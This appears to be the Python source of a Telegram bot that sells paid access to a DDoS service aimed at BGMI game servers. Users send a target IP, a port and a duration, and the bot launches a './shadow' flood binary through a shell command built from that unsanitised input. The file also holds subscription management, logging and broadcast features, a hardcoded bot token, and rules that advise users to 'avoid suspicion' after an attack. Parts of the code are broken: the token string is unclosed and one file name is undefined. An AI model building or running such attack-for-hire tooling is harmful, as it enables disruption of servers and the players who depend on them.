
import telebot
import subprocess
import datetime
import os


# insert your Telegram bot token here
bot = telebot.TeleBot('7419578096:AAHu1pUhz8bmto-Yf-8CwtiN9MJDzdOPG0I)

# Admin user IDs
admin_id = ["6312238286", "6312238286"]

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"invalid user file: {line}")
    except FileNotFoundError:
        pass

allowed_user_ids = read_users()
def log_command(user_id, target, port, time):
    admin_id = ["ADMIN ID"]
    user_info = bot.get_chat(user_id)
    if user_info.username:
        username = "@" + user_info.username
    else:
        username = f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file: 
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")

def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "NO DATA FOUND."
            else:
                file.truncate(0)
                response = "cleared successfully "
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if time:
        log_entry += f" | Time: {time}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

import datetime

user_approval_expiry = {}

def get_remaining_approval_time(user_id):
    expiry_date = user_approval_expiry.get(user_id)
    if expiry_date:
        remaining_time = expiry_date - datetime.datetime.now()
        if remaining_time.days < 0:
            return "Expired"
        else:
            return str(remaining_time)
    else:
        return "N/A"

def set_approval_expiry_date(user_id, duration, time_unit):
    current_time = datetime.datetime.now()
    if time_unit == "hour" or time_unit == "hours":
        expiry_date = current_time + datetime.timedelta(hours=duration)
    elif time_unit == "day" or time_unit == "days":
        expiry_date = current_time + datetime.timedelta(days=duration)
    elif time_unit == "week" or time_unit == "weeks":
        expiry_date = current_time + datetime.timedelta(weeks=duration)
    elif time_unit == "month" or time_unit == "months":
        expiry_date = current_time + datetime.timedelta(days=30 * duration)  
    else:
        return False
    
    user_approval_expiry[user_id] = expiry_date
    return True

@bot.message_handler(commands=['add'])
def add_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 2:
            user_to_add = command[1]
            duration_str = command[2]

            try:
                duration = int(duration_str[:-4])  
                if duration <= 0:
                    raise ValueError
                time_unit = duration_str[-4:].lower()  
                if time_unit not in ('hour', 'hours', 'day', 'days', 'week', 'weeks', 'month', 'months'):
                    raise ValueError
            except ValueError:
                response = "Invalid duration format "
                bot.reply_to(message, response)
                return

            if user_to_add not in allowed_user_ids:
                allowed_user_ids.append(user_to_add)
                with open(USER_FILE, "a") as file:
                    file.write(f"{user_to_add}\n")
                if set_approval_expiry_date(user_to_add, duration, time_unit):
                    response = f"User {user_to_add} added successfully for {duration} {time_unit}. Access will expire on {user_approval_expiry[user_to_add].strftime('%Y-%m-%d %H:%M:%S')} ."
                else:
                    response = "Failed to set approval expiry date. Please try again later."
            else:
                response = "User already exists."
        else:
            response = "Invlid use this - /add userid 99days."
    else:
        response = "You have not purchased yet purchase now from:-@SHADOW_OFFICIAL11."

    bot.reply_to(message, response)

@bot.message_handler(commands=['myinfo'])
def get_user_info(message):
    user_id = str(message.chat.id)
    user_info = bot.get_chat(user_id)
    username = user_info.username if user_info.username else "N/A"
    user_role = "Admin" if user_id in admin_id else "User"
    remaining_time = get_remaining_approval_time(user_id)
    response = f" Your Info:\n\n User ID: <code>{user_id}</code>\n Username: {username}\n Role: {user_role}\n Approval Expiry Date: {user_approval_expiry.get(user_id, 'Not Approved')}\n Remaining Approval Time: {remaining_time}"
    bot.reply_to(message, response, parse_mode="HTML")



@bot.message_handler(commands=['remove'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split()
        if len(command) > 1:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user_id in allowed_user_ids:
                        file.write(f"{user_id}\n")
                response = f"User {user_to_remove} removed successfully."
            else:
                response = f"User {user_to_remove} not found in the list ."
        else:
            response = '''Please Specify A User ID to Remove. 
 Usage: /remove <userid>'''
    else:
        response = "You have not purchased yet purchase now from:- @SHADOW_OFFICIAL11."

    bot.reply_to(message, response)

@bot.message_handler(commands=['clearlogs'])
def clear_logs_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(LOG_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "Logs are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "Logs Cleared Successfully "
        except FileNotFoundError:
            response = "Logs are already cleared ."
    else:
        response = "You have not purchased yet purchase now from :- @SHADOW_OFFICIAL11 ."
    bot.reply_to(message, response)


@bot.message_handler(commands=['clearusers'])
def clear_users_command(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r+") as file:
                log_content = file.read()
                if log_content.strip() == "":
                    response = "USERS are already cleared. No data found ."
                else:
                    file.truncate(0)
                    response = "users Cleared Successfully "
        except FileNotFoundError:
            response = "users are already cleared ."
    else:
        response = "DM TO BUY:- @SHADOW_OFFICIAL11."
    bot.reply_to(message, response)
 

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found "
        except FileNotFoundError:
            response = "No data found "
    else:
        response = "DM TO BUY:- @SHADOW_OFFICIAL11 ."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found ."
                bot.reply_to(message, response)
        else:
            response = "No data found "
            bot.reply_to(message, response)
    else:
        response = "DM TO BUY:- @SHADOW_OFFICIAL11 ."
        bot.reply_to(message, response)



import datetime
import time
import subprocess

import datetime
import time
import subprocess

def start_attack_reply(message, target, port, time_duration):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name

    # Initial response
    response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time_duration} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: FREE USERS:- @SHADOW_OFFICIAL11"
    sent_message = bot.reply_to(message, response)

    # Start the attack command
    full_command = f"./shadow {target} {port} {time_duration}"
    subprocess.Popen(full_command, shell=True)

    # Countdown logic
    last_sent_text = response
    for remaining_time in range(time_duration, 0, -1):
        countdown_response = f"{username}, 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {remaining_time} 𝐒𝐞𝐜𝐨𝐧𝐝𝐬\n𝐌𝐞𝐭𝐡𝐨𝐝: PAID USERS:- @SHADOW_OFFICIAL11"

        if countdown_response != last_sent_text:
            bot.edit_message_text(chat_id=sent_message.chat.id, message_id=sent_message.message_id, text=countdown_response)
            last_sent_text = countdown_response

        time.sleep(1)

    # Final response
    final_response = f"𝐀𝐓𝐓𝐀𝐂𝐊 𝐄𝐍𝐃𝐄𝐃.\n\n𝐓𝐚𝐫𝐠𝐞𝐭: {target}\n𝐏𝐨𝐫𝐭: {port}\n𝐓𝐢𝐦𝐞: {time_duration} Seconds Completed.\n𝐌𝐞𝐭𝐡𝐨𝐝: PAID USERS:- @SHADOW_OFFICIAL11"
    bot.edit_message_text(chat_id=sent_message.chat.id, message_id=sent_message.message_id, text=final_response)

bgmi_cooldown = {}

COOLDOWN_TIME = 10  # Cooldown time in seconds

@bot.message_handler(func=lambda msg: msg.text.lower().startswith("rand"))
def handle_arman(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        if user_id not in admin_id:
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
                response = "You Are On Cooldown. Please Wait 10sec Before Running The 'arman' Command Again."
                bot.reply_to(message, response)
                return

            bgmi_cooldown[user_id] = datetime.datetime.now()

        command = message.text.split()
        if len(command) == 4:  
            target = command[1]
            port = int(command[2])
            time_duration = int(command[3])
            if time_duration > 300:
                response = "Time interval must be less than 300."
                bot.reply_to(message, response)
            else:
                record_command_logs(user_id, 'arman', target, port, time_duration)
                log_command(user_id, target, port, time_duration)
                start_attack_reply(message, target, port, time_duration)
        else:
            response = "Usage: rand <target> <port> <time>\n\nEXAMPLE :- rand 20.284.34.34 10376 120" 
            bot.reply_to(message, response)
    else:
        response = "Unauthorized Access! \n\nDM to buy access: @SHADOW_OFFICIAL11"
        bot.reply_to(message, response)
        
@bot.message_handler(commands=['help'])
def show_help(message):
    help_text =''' Available commands:
 /bgmi : Method For Bgmi Servers. 
 /rules : Please Check Before Use !!.
 /mylogs : To Check Your Recents Attacks.
 /plan : Checkout Our Botnet Rates.
 /myinfo : TO Check Your WHOLE INFO.

 To See Admin Commands:
 /admincmd : Shows All Admin Commands.

Buy From :- @SHADOW_OFFICIAL11
Official Channel :- 
'''
    for handler in bot.message_handlers:
        if hasattr(handler, 'commands'):
            if message.text.startswith('/help'):
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
            elif handler.doc and 'admin' in handler.doc.lower():
                continue
            else:
                help_text += f"{handler.commands[0]}: {handler.doc}\n"
    bot.reply_to(message, help_text)

from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    # Welcome message with emojis
    response = f"""
✨ **Welcome, {user_name}!** ✨

🌐 **Premium DDOS Services** of **MR RANDOM** are here to give you the best tools!  
🚀 Unleash the power now and experience top-tier performance.

💼 **Need Access? Contact Us Below:**

🔗 **BUY ACCESS:** @SHADOW_OFFICIAL11
"""

    # Inline button to contact the owner
    markup = InlineKeyboardMarkup()
    contact_button = InlineKeyboardButton("📞 Contact Owner", url="https://t.me/SHADOW_OFFICIAL11")
    markup.add(contact_button)

    # Send the message with the button
    bot.reply_to(message, response, parse_mode="Markdown", reply_markup=markup)


@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f"""
🚨 **Hello, {user_name}! Please Follow These Rules To Avoid Getting Banned:** 🚨

1️⃣ **Don't Run Too Many Attacks!**  
   ❌ Overloading the bot can cause a **ban**. Use wisely!  

2️⃣ **Don't Run Multiple Attacks at the Same Time!**  
   ⚠️ Running 2 attacks simultaneously will get you **banned** immediately.

4️⃣ **Activity Monitoring:**  
   🛡️ We regularly **check the logs**, so always follow the rules to avoid a ban.  

5️⃣ **Pro Tip:**  
   🎮 After using DDOS, **play a normal match** before going offline to avoid suspicion.

💡 **Stay smart and enjoy our services!**  
   Contact us if you have any questions: [Contact Owner](https://t.me/SHADOW_OFFICIAL11)
"""
    bot.reply_to(message, response, parse_mode="Markdown")
    
@bot.message_handler(commands=['plan'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Their is no plan:

'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['admincmd'])
def welcome_plan(message):
    user_name = message.from_user.first_name
    response = f'''{user_name}, Admin Commands Are Here!!:

 /add <userId> : Add a User.
 /remove <userid> Remove a User.
 /allusers : Authorised Users Lists.
 /logs : All Users Logs.
 /broadcast : Broadcast a Message.
 /clearlogs : Clear The Logs File.
 /clearusers : Clear The USERS File.
'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['broadcast'])
def broadcast_message(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        command = message.text.split(maxsplit=1)
        if len(command) > 1:
            message_to_broadcast = "Message To All Users By Admin:\n\n" + command[1]
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                for user_id in user_ids:
                    try:
                        bot.send_message(user_id, message_to_broadcast)
                    except Exception as e:
                        print(f"Failed to send broadcast message to user {user_id}: {str(e)}")
            response = "Broadcast Message Sent Successfully To All Users."
        else:
            response = " Please Provide A Message To Broadcast."
    else:
        response = "Only Admin Can Run This Command ."

    bot.reply_to(message, response)



#bot.polling()
while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)

